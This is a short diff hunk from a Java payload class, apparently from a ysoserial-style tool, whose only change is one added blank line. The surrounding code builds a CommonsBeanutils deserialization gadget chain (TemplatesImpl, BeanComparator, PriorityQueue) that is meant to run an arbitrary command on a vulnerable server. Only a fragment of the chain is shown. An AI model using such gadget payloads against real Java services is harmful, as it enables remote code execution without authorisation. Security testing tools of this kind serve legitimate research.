@@ -15,6 +15,7 @@ public class cb192 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
+
         final BeanComparator        comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
         final PriorityQueue<Object> queue      = new PriorityQueue<Object>(2, comparator);
         queue.add("1");
